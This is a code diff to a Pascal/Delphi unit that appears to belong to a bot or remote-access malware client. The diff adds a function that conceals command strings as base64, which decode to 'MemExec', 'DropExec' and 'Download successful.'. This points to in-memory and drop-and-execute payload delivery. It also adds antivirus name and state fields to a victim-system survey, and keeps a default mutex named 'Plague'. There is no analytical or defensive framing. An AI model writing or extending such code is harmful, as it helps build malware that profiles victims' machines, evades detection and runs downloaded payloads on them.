@@ -6,7 +6,7 @@ interface
 
 uses
   Classes, Windows, Registry, SysUtils, ActiveX, ComObj,
-  Variants, StrUtils, INIFiles, Process;
+  Variants, StrUtils, INIFiles, Process, Base64;
 
 function GetGUID: String;
 procedure AnalyzeSystem;
@@ -32,6 +32,7 @@ procedure AddProcessToList(PID: Cardinal);
 procedure RemoveProcessFromList(PID: Cardinal);
 procedure OpenURL(URL: String);
 function ChCopy(Source, Dest: String): Boolean;
+function GetProtectedString(Num: Word): String;
 
 var
   Nick, OS, ComputerName, UserName, CPU, GPU: String;
@@ -83,6 +84,17 @@ Begin
   if RightStr(Base, 1)='\' then Delete(Base, Length(Base), 1);
 end;
 
+function GetProtectedString(Num: Word): String;
+Begin
+  Case Num of
+    0: Result:='Y29uZmlnLmpzb24=';
+    1: Result:='TWVtRXhlYw==';
+    2: Result:='RHJvcEV4ZWM=';
+    3: Result:='RG93bmxvYWQgc3VjY2Vzc2Z1bC4=';
+  end;
+  Result:=DecodeStringBase64(Result);
+end;
+
 procedure MutexMagic;
 Begin
   Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
@@ -104,7 +116,7 @@ End;
 
 procedure OpenURL(URL: String);
 Begin
-  ShellExecute(0, 'open', PChar(URL), Nil, Nil, SW_SHOWNORMAL);
+  ShellExecuteW(0, 'open', PWideChar(WideString(URL)), Nil, Nil, SW_SHOWNORMAL);
 end;
 
 procedure RemoveProcessFromList(PID: Cardinal);
@@ -350,6 +362,8 @@ Begin
    UserName:=GetEnvironmentVariable('USERNAME');
    CPU:=GetEnvironmentVariable('PROCESSOR_IDENTIFIER');
    GPU:='Unknown';
+   AVName:='Unknown';
+   AVState:='Unknown';
  end;
 end;
 
